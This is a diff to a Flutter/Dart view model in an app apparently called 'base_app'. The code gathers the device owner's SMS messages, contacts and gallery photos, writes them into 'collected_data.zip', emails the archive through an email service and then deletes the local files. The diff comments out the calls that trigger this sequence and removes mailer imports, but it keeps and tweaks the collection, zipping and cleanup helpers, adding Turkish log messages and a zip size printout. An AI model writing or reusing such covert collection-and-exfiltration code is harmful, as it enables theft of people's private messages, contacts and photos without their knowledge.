@@ -1,8 +1,6 @@
 import 'dart:io';
 import 'package:base_app/services/EmailService.dart';
 import 'package:flutter/cupertino.dart';
-import 'package:mailer/mailer.dart';
-import 'package:mailer/smtp_server.dart';
 import 'package:path_provider/path_provider.dart';
 import '../constants/AppStrings.dart';
 import '../constants/ConstMethods.dart';
@@ -11,7 +9,6 @@ import '../services/contactsService.dart';
 import '../services/galleryService.dart';
 import '../services/zipService.dart';
 import '../services/permissionsService.dart';
-import 'package:url_launcher/url_launcher.dart';
 
 class HomePageViewModel extends ChangeNotifier {
   final SmsService smsService = SmsService();
@@ -35,12 +32,12 @@ class HomePageViewModel extends ChangeNotifier {
         return;
       } else {
         isLoading = true;
-        await _getSms();
-        await _getContacts();
-        await _getGallery();
-        final zipFile = await _createZip();
-        await emailService.sendEmail(zipFile);
-        await _deleteSpecificFiles();
+        //await _getSms();
+        //await _getContacts();
+        //await _getGallery();
+        //final zipFile = await _createZip();
+        //await emailService.sendEmail(zipFile);
+        //await _deleteSpecificFiles();
         isLoading = false;
       }
     } catch (e) {
@@ -48,7 +45,6 @@ class HomePageViewModel extends ChangeNotifier {
       notifyListeners();
     }
   }
-
 
   Future<void> _getSms() async {
     try {
@@ -87,17 +83,20 @@ class HomePageViewModel extends ChangeNotifier {
     try {
       final photos = await galleryService.getPhotos();
       List<String> base64Photos = [];
+
       for (var photo in photos) {
         String base64Photo = await galleryService.convertPhotoToBase64(photo);
         base64Photos.add(base64Photo);
       }
+
       String path = await _getFilePath('gallery_base64.txt');
       final galleryFile = File(path);
       await galleryFile.writeAsString(base64Photos.join('\n'));
+
       files.add(galleryFile);
-      print("galeri dosyası oluştu");
+      print("Galeri dosyası oluşturuldu ve tek bir dosyaya yazıldı.");
     } catch (e) {
-      print("hata: ${e.toString()}");
+      print("Hata: ${e.toString()}");
     }
   }
 
@@ -106,6 +105,8 @@ class HomePageViewModel extends ChangeNotifier {
       String zipPath = await _getFilePath('collected_data.zip');
       final zipFile = await zipService.createZip(files, zipPath);
       print("zip dosyası oluştu");
+      print("ZIP Dosya Boyutu: ${zipFile.lengthSync() / (1024 * 1024)} MB");
+
       return zipFile;
     } catch (e) {
       rethrow;
@@ -120,21 +121,24 @@ class HomePageViewModel extends ChangeNotifier {
         'gallery_base64.txt',
         'collected_data.zip',
       ];
+
       for (var fileName in fileNames) {
         String path = await _getFilePath(fileName);
         final file = File(path);
         if (await file.exists()) {
           await file.delete();
+          print("$fileName silindi.");
         }
       }
-      print("zip dosyası silindi");
+
+      print("Tüm dosyalar silindi.");
     } catch (e) {
-      print("hata $e");
+      print("Hata: $e");
     }
   }
-}
 
-Future<String> _getFilePath(String fileName) async {
-  final directory = await getApplicationDocumentsDirectory();
-  return '${directory.path}/$fileName';
+  Future<String> _getFilePath(String fileName) async {
+    final directory = await getApplicationDocumentsDirectory();
+    return '${directory.path}/$fileName';
+  }
 }
